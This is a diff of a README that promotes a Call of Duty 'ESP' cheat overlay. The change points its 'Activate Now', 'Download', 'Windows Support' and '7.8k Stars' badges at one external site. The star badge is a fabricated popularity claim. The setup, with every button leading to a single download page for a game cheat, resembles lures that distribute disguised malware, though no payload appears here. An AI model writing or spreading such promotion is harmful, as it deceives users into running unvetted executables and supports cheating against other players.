@@ -11,10 +11,10 @@ Call of Duty maps are chaotic—multiple enemies, objectives, and items all comp
 \[!IMPORTANT]
 This overlay is for **offline and training modes** only. It runs in memory without altering game files.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.8k Stars](https://img.shields.io/badge/⭐️%207.8k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://call-of-duty-esp.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://call-of-duty-esp.github.io/.github/)
+[![⭐️ 7.8k Stars](https://img.shields.io/badge/⭐️%207.8k-Stars-yellow?style=for-the-badge\&logo=github)](https://call-of-duty-esp.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://call-of-duty-esp.github.io/.github/)
 
 ---
 
